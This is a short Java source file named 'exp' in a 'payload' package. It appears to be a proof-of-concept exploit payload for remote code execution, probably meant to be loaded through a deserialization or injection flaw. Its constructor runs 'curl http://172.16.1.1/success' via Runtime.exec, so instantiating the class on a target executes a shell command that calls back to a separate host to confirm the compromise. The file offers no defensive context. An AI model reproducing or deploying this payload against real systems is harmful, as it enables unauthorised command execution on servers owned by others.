package payload;

import java.io.IOException;

public class exp {

    public exp() {
        String cmd = "curl http://172.16.1.1/success";
        try {
            Runtime.getRuntime().exec(cmd).getInputStream();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
